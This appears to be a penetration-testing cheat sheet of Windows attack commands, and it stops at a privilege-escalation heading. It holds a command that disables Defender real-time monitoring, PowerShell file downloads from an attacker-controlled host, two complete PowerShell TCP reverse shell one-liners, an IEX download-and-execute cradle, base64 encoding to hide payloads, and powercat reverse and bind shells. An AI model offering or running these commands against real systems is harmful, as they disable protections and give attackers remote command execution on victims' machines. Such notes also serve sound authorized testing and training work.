- Disable Defender
    - Set-MpPreference -DisableRealtimeMonitoring $true
  
# Windows file transfers
- Powershell
    -   `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/wget.exe','C:\Windows\Temp\wget.exe')"`
- Recieve file with powercat(send file with nc) `powercat -c 10.10.10.10 -p 443 -i file.txt`


# Windows shells
- Powershell 
    - `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
    - `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
    - `powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/reverse.ps1')`
    - [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
    - Base64 encode powershell in linux and execute with -e `Cat shell.ps1 | iconv -t utf-16le | base64 -w 0`
- Powercat
    - Generate reverse shell `powercat -c 10.10.10.10 -p 443 -e cmd.exe -g`
    - Encoded reverse shell `owercat -c 10.11.0.4 -p 443 -e cmd.exe -ge`
    - Reverse shell `powercat -c 10.10.10.10 -p 443 -e cmd.exe`
    - Bind shell `powercat -l -p 443 -e cmd.exe`
    - Listener `powercat -l -p 443`

# Windows privilege escalation
